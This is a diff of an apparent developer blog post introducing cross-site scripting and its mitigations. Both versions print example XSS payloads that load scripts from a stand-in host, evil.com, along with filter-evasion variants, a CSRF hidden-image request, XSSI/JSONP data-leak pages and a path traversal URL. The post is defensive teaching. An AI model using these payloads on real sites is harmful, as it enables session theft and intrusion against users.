@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Basic XSS and how to mitigate it || Fritz Stelluto</title>
+  <title>Introduction to XSS and how to mitigate it || Fritz Stelluto</title>
   <meta name="author" content="gotofritz">
-  <meta name="description" content="Cross Site Scripting (XSS) is a vulnerability which allows an attacker to run malicious code, typically javascript, in a victim&amp;#39;s browser or other app which can run it.">
+  <meta name="description" content="Cross Site Scripting (XSS) is a vulnerability which allows an attacker to run malicious code, typically javascript, in a victim&amp;#39;s browser or any app which can run web content.">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <link href="/assets/favicon.ico" rel="shortcut icon">
   <link rel="icon" href="/assets/favicon.gif" type="image/gif" />
@@ -31,7 +31,7 @@
 
 <div id="content" class="inner">
   <article class="post">
-    <h1 class="title">Basic XSS and how to mitigate it</h1>
+    <h1 class="title">Introduction to XSS and how to mitigate it</h1>
     <div>
       <div class="meta">
         <div class="date">
@@ -44,27 +44,43 @@
       </div>
       <div class="entry-content">
     
-<p>Cross Site Scripting (XSS) is a vulnerability which allows an attacker to run malicious code, typically javascript, in a victim&#39;s browser or other app which can run it.<!--more--></p>
+<p>Cross Site Scripting (XSS) is a vulnerability which allows an attacker to run malicious code, typically javascript, in a victim&#39;s browser or any app which can run web content.<!--more--></p>
 <h2 id="what-is-a-cross-site-scripting-xss-attack-">What is a Cross Site Scripting (XSS) attack?</h2>
-<p>The &quot;cross site&quot; part comes because the malicious code lives in the attacker&#39;s server (or a third party the attacker has access to). There are two ways an attacker can inject malicious code into a target machine: by submitting it to sites that accept user content like comments, etc (<strong>stored XSS</strong>), or by creating malicious URLs which when browsed to, trigger the attack (<strong>reflected XSS</strong>).</p>
-<p>Typically malicious code includes some trick to include a script tag with the code that does the damage</p>
-<pre><code>&lt;script src=&quot;http://evil.com/oh-dear.js&quot;&gt;&lt;/script&gt; Just an innocent comment...
-</code></pre><p>To defuse the attacks, code and links need to be sanitised.</p>
-<h3 id="can-code-from-different-domains-be-run-in-a-web-page-and-why-">Can code from different domains be run in a web page? And why?</h3>
-<p>Yes. This is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS">Cross-Origin Resource Sharing (CORS)</a> and there are good reasons for it.</p>
-<p>People want to import third party code into their sites - the classic example is Google Analytics. Or they want to use versions of popular libraries stored in a <abbr title="Content Delivery Network">CDN</abbr> (think JQuery, hosted on //code.jquery.com/), hoping that your visitor will have it already in their cache by the time they visit your site. Or, for sites still using HTTP 1, they want to put their assets on different subdomain, because a browser only downloads a limited amount of files in parallel from the same domain (think Yahoo, who put all their assets on //s.yimg.com). Or a global website with a variety of localised subdomains (think amazon.de, amazon.fr ... all downloading scripts from amazon.com). Or while developing, they want to download assets from the live site (say www.example.com) while developing on a subdomain (new-version.example.com)</p>
-<h3 id="can-you-control-which-domain-dowloads-which-scripts-">Can you control which domain dowloads which scripts?</h3>
-<p>There is an http header which you can set in your server, Access-Control-Allow-Origin, to control who can download <em>your</em> assets. This is universally supported, but it doesn&#39;t really help with xss - it was really designed to stop people using <em>your</em> code on <em>their</em> pages, while you want the opposite: you want to stop <em>their</em> code on <em>your</em> pages.</p>
-<p>What you really want is the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a>, which tells the browser what domains are allowed to be included in a page. This is relatively new and browser support is not quite there yet.</p>
-<h2 id="stored-xss-file-upload-displayed-in-an-iframe">Stored XSS: File Upload displayed in an iframe</h2>
+<p>This is easier explained by reading it backwards. It is an <i>attack</i> which consists in tricking the victim into running a <i>script</i> which is stored <i>across in another site</i>. This is typically the attacker&#39;s own site or a third party they have hacked and are using without the owner knowing.</p>
+<p>To trick the victim, the attacker injects a snippet of malicious code somewhere where the unwary user will run it; this snippet will either download the malicious code from the attacker&#39;s server, or redirect the user to it. The attacker can inject the snippet either by submitting it to sites that accept user content like comments, etc (<strong>stored XSS</strong>), or by creating malicious URLs which when browsed to, trigger the attack (<strong>reflected XSS</strong>).</p>
+<h3 id="how-serious-is-the-threat-">How serious is the threat?</h3>
+<p>It&#39;s very serious, probably the biggest vulnerability on the web. But not only; many desktop apps nowadays are nothing more than a (Chrome) web browser disguised as an app, so they are also vulnerable. Apps like WhatsApp, Slack, code editors like Visual Studio Code,  Google Play App, the list is indeed very long.</p>
+<h3 id="how-do-you-prevent-xss-">How do you prevent XSS?</h3>
+<p>As a user your only, limited, defence is to be careful what links you click on. But the onus is really on engineers to ensure the systems they design do not allow injection of malicious code. This is achieved by sanitising any content uploaded by users, as well as other measures. If you are the owner of a website that would be your responsability.</p>
+<h3 id="what-does-malicious-xss-code-look-like-">What does malicious XSS code look like?</h3>
+<p>Simple XSS code examples use tricks to include a script tag with the code that does the damage.</p>
+<p><code class="language-markup">&lt;script src=&quot;http://evil.com/oh-dear.js&quot;&gt;&lt;/script&gt; Just
+an innocent comment on a message board...</code></p>
+<h3 id="how-comes-web-browsers-allow-code-from-third-parties-to-run-on-my-website-">How comes web browsers allow code from third parties to run on MY website?</h3>
+<p>From the early days of the web, development has been driven by advertising (in the form of banner ads, originally). This is implemented by inserting code from the advertising networks in people&#39;s websites, so for the web to be successful it was seen as essential that browsers didn&#39;t block scripts from third parties. Google Analytics is probably the most universally downloaded script in the whole internet.</p>
+<p>And back in the days of <abbr title="A protocol used by servers that performed better if you put your assets under different domains">HTTP 1</abbr> people were also keen to host scripting libraries like jQuery on shared hosts, hoping that the user had already downloaded them from another site and therefore wouldn&#39;t need to do so again.</p>
+<p>And multinational websites such as Amazon want to share their assets between amazon.de, amazon.com, amazon.co.jp ... And while developing, site owners want to download assets from the live site (say www.example.com) while developing on a subdomain (new-version.example.com)</p>
+<p>So there are good reasons for allowing <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS">Cross-Origin Resource Sharing (CORS)</a>, which is the technical name for it, and why browser manufacturers took no steps to disable it until very recently.</p>
+<p>What they <em>did</em> take care of was providing a way for site owners to protect copyright on their assets, so that third parties cannot include <em>your</em> scripts or fonts or JSON data in <em>their</em> site. This is achieved with the Access-Control-Allow-Origin and related CORS headers. Although third parties can easily download those assets and then host them somewhere out of your reach.</p>
+<h3 id="are-there-any-server-headers-that-can-help-with-xss-">Are there any server headers that can help with XSS?</h3>
+<p>Eventually browser manufacturers came around the idea that <em>maybe</em> they should try and protect their users from XSS, and the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a> was introduced. This does exactly what you expect - it allows you to say, for example, &quot;only load css from these domains, JS from those&quot; and so on. Sadly it took them a while and only the latest browsers are compliant. Not IE11 for example. But it&#39;s definitively a step in the right direction.</p>
+<p>You can find out more about CSP, including supported browsers, on this <a href="https://content-security-policy.com/">reference site by Foundeo</a></p>
+<h2 id="types-of-xss-stored-xss-and-reflected-xss">Types of XSS: Stored XSS and Reflected XSS</h2>
+<p>In stored XSS the attacker finds a way to inject malicius code in a site you visit - for example a news site, an illegal download site, or often a banner ad. In reflected XSS the attacker creates a link which, when you click, results in you infecting yourself.</p>
+<h3 id="stored-xss-file-upload-displayed-in-an-iframe">Stored XSS: File Upload displayed in an iframe</h3>
 <p>When a site allows users to upload files which are then displayed to other users in an iframe, an attacker could upload an HTML file with a script tag inside</p>
-<pre><code>This is my cool HTML page &lt;script&gt;&lt;!--
+<p><code class="language-markup">This is my cool HTML page &lt;script&gt;<!--
 ... here I can do evil things ...
---&gt;&lt;/script&gt;
-</code></pre><p>This is a relatively simple attack to mitigate. Since you control the server where the malicious code is stored, you can simply make sure the uploaded documents are saved on a separate subdomain, say <code>user-content.example.com</code>, and then it won&#39;t have access to content on the main domain.</p>
-<h2 id="reflected-xss">Reflected XSS</h2>
-<p>The classic reflected XSS attack tries to add a script tag to a url: <code>https://example.com/&lt;script&gt;..evil.. &lt;/script&gt;</code>. Of course the attach will never be so blatant. But browsers and other apps can do substitutions for special characters. Although these days they have built-in protection for most cases, it&#39;s interesting to know what we are being protected against. And anyway, some day you may find yourself coding for an environment where it doesn&#39;t exist</p>
+-->&lt;/script&gt;</code></p>
+<p>This is a relatively simple attack to mitigate. Since you control the server where the malicious code is stored, you can simply make sure the uploaded documents are saved on a separate subdomain, say <code>user-content.example.com</code>, and then it won&#39;t have access to content on the main domain.</p>
+<h3 id="reflected-xss">Reflected XSS</h3>
+<p>The classic reflected XSS attack tries to add a script tag to a url:
+<code class="language-markup">https://example.com/<script>..evil.. </script></code></p>
+<p>Of course the attack will never be so blatant, but will use the browsers&#39; built-in ability to do substitutions for special character encoding. Nowadays browsers protect against such attacks, but it&#39;s interesting to see what they are like anyway</p>
 <dl class="code-breakdown">
+  <dt class="long-line">example.com/&lt;scritpt&gt;</dt>
+  <dd class="long-line">blatant</dd>
+
   <dt class="long-line">example.com/%3cscritpt%3e</dt>
   <dd class="long-line">URL % encoding</dd>
 
@@ -90,25 +106,20 @@
   <dd class="long-line">ASCII encoding with unicode</dd>
 
   <dt class="long-line">example.com/+AD4-script+ADw-</dt>
-  <dd class="long-line">a C style encoding</dd>
-
-  <dt class="long-line">...</dt>
-  <dd class="long-line"></dd>
+  <dd class="long-line">C style encoding</dd>
 
 </dl>
 
-<h2 id="stored-xss">Stored XSS</h2>
-<p>The typical stored XSS attack you have a comment system or something, and the attacker tries to submit an HTML fragment with a script tag in it. There are different ways they can try that.</p>
-<h3 id="simple-attacks-with-script-tags-and-html-sanitasion">Simple attacks with script tags and HTML sanitasion</h3>
-<p>The obvious way may work, if the site was built by hobbysts or amateurs. But a simple regular expression is usually enough to stop that.</p>
-<pre><code>Great site! &lt;script src=&quot;http://evil.com/xss.js&quot;&gt;&lt;/script&gt;
-</code></pre><p>Regular expressions are not the best approach though. One reason is that you can easily match valid HTML, but attackers often get around them by submitting <em>invalid</em> HTML, taking advantage of the fact browsers are very forgiving. So they could submit the following</p>
-<pre><code>Great site! &lt;a href=&quot;&lt;script src=&quot;http://evil.com/xss.js&quot;&gt;&lt;/script&gt;
-</code></pre><p>Or use hidden, non-rendered characters that can break a regular expression but are ignored by many browsers</p>
-<pre><code>Great site! &lt;scr\0ipt src=&quot;http://evil.com/xss.js&quot;&gt;&lt;/sc\0ript&gt;
-</code></pre><p>Or even simply upper case letters</p>
-<pre><code>Great site! &lt;SCRIPT SRC=&quot;http://evil.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-</code></pre><p>The best approach to sanitasion is:</p>
+<h3 id="stored-xss-simple-attacks-with-script-tags-and-html-sanitasion">Stored XSS: Simple attacks with script tags and HTML sanitasion</h3>
+<p>The simplest XSS attack below may work, if the site was built by hobbysts or amateurs. But a simple regular expression is usually enough to stop that.
+<code class="language-markup">Great site! <script src="http://evil.com/xss.js"></script></code></p>
+<p>Regular expressions are not the best approach though. One reason is that you can easily match valid HTML, but attackers often get around them by submitting <em>invalid</em> HTML, taking advantage of the fact browsers are very forgiving. So they could submit the following
+<code class="language-markup">Great site! &lt;a href=&quot;<script src="http://evil.com/xss.js"></script></code></p>
+<p>Or use hidden, non-rendered characters that can break a regular expression but are ignored by many browsers
+<code class="language-markup">Great site! &lt;scr\0ipt src=&quot;http://evil.com/xss.js&quot;&gt;&lt;/sc\0ript&gt;</code></p>
+<p>Or even simply upper case letters
+<code class="language-markup">Great site! &lt;SCRIPT SRC=&quot;http://evil.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p>
+<p>The best approach to sanitasion is:</p>
 <ul>
 <li>parse the input into a DOM tree which is <em>not</em> rendered in the page</li>
 <li>have a white list of allowed tags and attributed, and go through every node of rendered DOM, deleting what is not the whitelist</li>
@@ -116,65 +127,79 @@
 </ul>
 <h3 id="using-html-attributes-for-xss-attacks">Using HTML attributes for xss attacks</h3>
 <p>One doesn&#39;t necessarily need a script tag to store XSS - one can simply have some javascript in a tag attribute. The following would be triggered when someone moves the mouse over the comment</p>
-<pre><code>&lt;p ONMOUSEOVER=&quot;var d=document;var s=d.createElement(&#39;script&#39;);s.src=&#39;http://evil.com/xss.js&#39;;d.appendChild(s);&quot;&gt;Great site!&lt;/p&gt;
-</code></pre><h3 id="using-css-attributes-for-xss-attacks">Using CSS attributes for xss attacks</h3>
+<p><code class="language-markup"><p ONMOUSEOVER="var d=document;var s=d.createElement('script');s.src='http://evil.com/xss.js';d.appendChild(s);">Great site!</p></code></p>
+<h3 id="stored-xss-using-css-attributes-for-xss-attacks">Stored XSS: Using CSS attributes for xss attacks</h3>
 <p>If a site allows user to, say, choose a color for the text of the comments, you could submit something like <code>red;&quot; onmouseover=&quot;...evil JS...&quot;</code> and then you can have</p>
-<pre><code>&lt;!-- what the coder expected the final results to be when they built the site --&gt;
-&lt;p style=&quot;color:SOME_CUSTOM_COLOR;&quot;&gt;My Home Page&lt;/p&gt;
-&lt;!-- what the attacker injected --&gt;
-&lt;p style=&quot;color:red;&quot; onmouseover=&quot;...evil JS...&quot;&gt;My Home Page&lt;/p&gt;
-</code></pre><h3 id="stored-javascript">Stored Javascript</h3>
+<pre><code class="language-markup">
+<!-- what the coder expected the final results to be when
+they built the site -->
+<p style="color:SOME_CUSTOM_COLOR;">My Home Page</p>
+
+<!-- what the attacker injected -->
+<p style="color:red;" onmouseover="...evil JS...">My Home Page</p></code></pre>
+
+<h3 id="stored-xss-javascript">Stored XSS: Javascript</h3>
 <p>A typical XSS fragment for a site that allows user submissions:</p>
-<pre><code>innocent looking text and then &lt;span style=display:none&gt;&quot;
-+ (...evil js..., &quot;&quot;)
-+ &quot;&lt;/span&gt; nothing to see here
-</code></pre><p>That relies on the fact that the code will be inserted into the page via JS, with code such as</p>
-<pre><code>$someElement.innerHTML = &quot;innocent looking text and then &lt;span style=display:none&gt;&quot;
-+ (...evil js..., &quot;&quot;)
-+ &quot;&lt;/span&gt; nothing to see here&quot;;
-</code></pre><p>The not so common comman operator at <code>(...evil js..., &quot;&quot;)</code> returns the item on the right. The comma operator is often used when golfing / minifying, but not often when hand coding because of its unreadability. It simply executes the item on the left then ignores it and returns the one on the right: <code>var a = (1, 2); console.log(a); //2</code>.</p>
+<pre><code class="language-markup">blah &lt;span style=&apos;display:none&apos;&gt;"
++ (...evil js..., "")
++ "&lt;/span&gt; nothing to see here
+</code></pre>
+
+<p>That relies on the fact that the code will be inserted into the page via JS, with code such as</p>
+<pre><code class="language-markup">$el.innerHTML = "blah &lt;span style=&apos;display:none&apos;>"
++ (...evil js..., "")
++ "</span> nothing to see here";</code></pre>
+
+<p>The not so common comma operator at <code>(...evil js..., &quot;&quot;)</code> returns the item on the right. The comma operator is often used when golfing / minifying, but not often when hand coding because of its unreadability. It simply executes the item on the left then ignores it and returns the one on the right: <code>var a = (1, 2); console.log(a); //2</code>.</p>
 <p>So it is important to escape strings that will be handled by JS with \x27 for single quotes and \x22 for doubles.</p>
-<h3 id="reflected-xss-via-ajax">Reflected XSS via AJAX</h3>
+<h3 id="reflected-xss-ajax">Reflected XSS: AJAX</h3>
 <p>Sometimes a site runs a fragment of a paragraph. An example is Google Translate: <code>https://translate.google.com/#en/de/...evil js...</code>, where &quot;...evil js...&quot; could be <code>&lt;script&gt;evil js&lt;/script&gt;</code> and may be inserted in the translation box and translated, if the site isn&#39;t careful (obviously Google are). The way to handle this is to escape the <code>&lt;&gt;</code> characters with <code>\x3c\x3e</code>. It is also important to set the charset of your document with <code>Content-Type: text/html; charset=utf-8</code>, to avoid the browser interpreting as utf-7, where <code>+ADw-</code> and <code>+AD4-</code> are the encodings for <code>&lt;</code> and <code>&gt;</code>.</p>
 <h2 id="cross-site-request-forgery-xsrf-">Cross-Site Request Forgery (XSRF)</h2>
 <p>This happens when an attacker stores some code in a page that requests a resource (often an image, but could be the favicon too for example) from a separate third party site, for example your bank, or Facebook (unlikely they don&#39;t protect themselves from such attacks, though). If you are already logged in the third party site, the browser will send cookies and everything else to that site. So you could have an exploit such as</p>
-<pre><code>An innocent message, la la
+<pre><code class="language-markup">An innocent message, la la
 &lt;img
-    // attacker hides the exploit
-    style=&quot;display:none&quot;
+    <!-- attacker hides the exploit -->
+    style="display:none"
 
-    // this is a (fake) command which the user needs to be logged in to run;
-    // but if the user IS already logged in, then it will be run,
-    // as the cookies will be sent. It doesn&#39;t matter that the response
-    // is not an image, because of the display:none
-    src=&quot;http://facebook.com/post/?msg=blah&quot;
-    &gt;
-</code></pre><p>To mitigate against those attacks, for a start make sure you use POST and not GET in your request. With your POST request, send a token with a timestamp, and expire login if the timestamp is too old (old = a few minutes). Generate a new token for every request. Maybe even generate different tokens for different types of requests.</p>
+    <!-- this is a (fake) command which the user needs
+    to be logged in to run; but if the user IS already logged in,
+    then it WILL be run, as the cookies will be sent. It doesn't matter
+    that the response is not an image, because of the display:none -->
+    src="http://facebook.com/post/?msg=blah"
+    ></code></pre>
+
+<p>To mitigate against those attacks, for a start make sure you use POST and not GET in your request. With your POST request, send a token with a timestamp, and expire login if the timestamp is too old (old = a few minutes). Generate a new token for every request. Maybe even generate different tokens for different types of requests.</p>
 <h2 id="cross-site-script-inclusion-xssi-">Cross Site Script Inclusion (XSSI)</h2>
 <p>In this case the attacker includes <em>your</em> script in <em>their</em> page. That way they can read any variables accessible to your script, since the browser doesn&#39;t distinguish between the two environments. The simplest example is if someone has sensitive data simply embedded in the JS</p>
-<pre><code>// your_script.js
-var privateKey = &quot;-----BEGIN RSA PRIVATE KEY-----&quot; // etc
+<pre><code class="language-markup">// your_script.js
+var privateKey = "-----BEGIN RSA PRIVATE KEY-----" // etc
 
 // attacker_page.html
-&lt;!doctype HTML&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;script src=&quot;your_script.js&quot;&gt;&lt;/script&gt;
-    &lt;script&gt;alert(privateKey)&lt;/script&gt;
+<!doctype HTML>
+<html>
+<head>
+    <script src="your_script.js"></script>
+    <script>alert(privateKey)</script>
 ...
-</code></pre><p>Another source of attacks is JSONP, as an attacker can simply override the callback function</p>
-<pre><code>// attacker_page.html
-&lt;script&gt;
+</code></pre>
+
+<p>Another source of attacks is JSONP, as an attacker can simply override the callback function</p>
+<pre><code class="language-markup">
+// attacker_page.html
+<script>
     var my_callback = function (my_leaked_data) {
         doEvil(JSON.stringify(my_leaked_data));
     };
-&lt;/script&gt;
-&lt;script src=&quot;https://your_site/p?jsonp=my_callback&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
-</code></pre><p>The defence is simply not to put sensitive information inside JS or JSONP responses. Other steps are the same as for XSRF (use POST, use tokens), and make scripts non-executables by adding prefixes such as <code>])}while(1);&lt;/x&gt;</code></p>
+</script>
+<script src="https://your_site/p?jsonp=my_callback"></script>
+</code></pre>
+
+<p>The defence is simply not to put sensitive information inside JS or JSONP responses. Other steps are the same as for XSRF (use POST, use tokens), and make scripts non-executables by adding prefixes such as <code>])}while(1);&lt;/x&gt;</code></p>
 <h2 id="path-traversal">Path Traversal</h2>
 <p>The classic exploit which tries to trick the server into serving files outside the server root.</p>
-<pre><code>https://example.com/../../../../../../../etc/passwd
-</code></pre><p>Few servers are configured by default to allow that, but be careful with customising configurations. Also, careful in allowing users to chose strings such as <code>brett/../../</code> as username.</p>
+<pre><code class="language-markup">https://example.com/../../../../../../../etc/passwd</code></pre>
+
+<p>Few servers are configured by default to allow that, but be careful with customising configurations. Also, careful in allowing users to chose strings such as <code>brett/../../</code> as username.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>This is just scratching the surface of XSS and related attacks; it is a specialist fields which, however, every front end developer should at least be familiar with.</p>
 
